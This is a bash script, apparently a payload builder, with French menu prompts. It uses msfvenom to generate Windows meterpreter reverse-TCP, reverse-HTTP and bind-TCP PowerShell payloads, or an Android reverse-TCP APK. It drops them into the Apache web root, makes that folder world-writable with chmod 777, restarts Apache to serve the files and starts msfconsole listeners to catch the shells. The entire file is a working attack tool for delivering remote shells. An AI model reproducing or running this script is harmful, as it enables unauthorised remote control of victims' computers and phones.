#!/bin/bash
#Colors
b="\033[33m"
g="\033[32m"
r="\033[31m"
w="\033[00m"
#Colors
ip=$(hostname -I)
done=$(echo -e "$g Successfully created the payload.$w \nPATH= /var/www/html/ \nIP= $ip\nPORT= 4444\nGlHf for now.")
echo -e "$g 1.$w meterpreter"
echo -e "$g 2.$w android"
echo -ne "Choix : $g"
read resp1
echo -e "$w"

if [ $resp1 = 1 ]; then
  clear
  echo -e "$g 1.$w Rev_TCP"
  echo -e "$g 2.$w Rev_HTTP"
  echo -e "$g 3.$w Bind_TCP"
  echo -ne "Choix : $g"
  read resp2
  echo -e "$w"
elif [ $resp1 = 2 ]; then
  clear
  echo -e "$g 1.$w Rev_TCP"
  echo -e "$g 2.$w skip"
  echo -ne "Choix : $g"
  read resp2
  echo -e "$w"
else
  echo -e "$r error.$w"
fi

if [ $resp1 = 1 ] && [ $resp2 = 1 ]; then
  clear
  echo -e "$g Creating payload...$w"
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(hostname -I) LPORT=4444 -f powershell > /var/www/html/power.bat
  echo "$done"
elif [ $resp1 = 1 ] && [ $resp2 = 2 ]; then
  clear
  echo -e "$g Creating payload...$w"
  msfvenom -p windows/meterpreter/reverse_http LHOST=$(hostname -I) LPORT=4444 -f powershell > /var/www/html/power.bat
  echo "$done"
elif [ $resp1 = 1 ] && [ $resp2 = 3 ]; then
  clear
  echo -e "$g Creating payload...$w"
  msfvenom -p windows/meterpreter/bind_tcp LHOST=$(hostname -I) LPORT=4444 -f powershell > /var/www/html/power.bat
  echo "$done"
elif [ $resp1 = 2 ] && [ $resp2 = 1 ]; then
  clear
  echo -e "$g Creating payload...$w"
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.apk
  echo "$done"
elif [ $resp1 = 2 ] && [ $resp2 = 2 ]; then
  clear
  echo -e "$g Creating payload... or not.$w "
  echo "$done"
else
  echo -e "$r error.$w"
fi

echo -e "$b CHMODing the payload. $w"
chmod 777 -R /var/www/html/
echo -e "$b Starting Apache2 service...$w"
service apache2 restart
echo -e "$b Apache2 successfuly restarted.$w"
service apache2 status
echo -e "$g Starting the listener.. (this may take a while..)$w"

if [ $resp1 = 1 ]; then
  msfconsole -r Listen.rb
elif [ $resp1 = 2 ]; then
  msfconsole -r ListenAndro.rb
fi
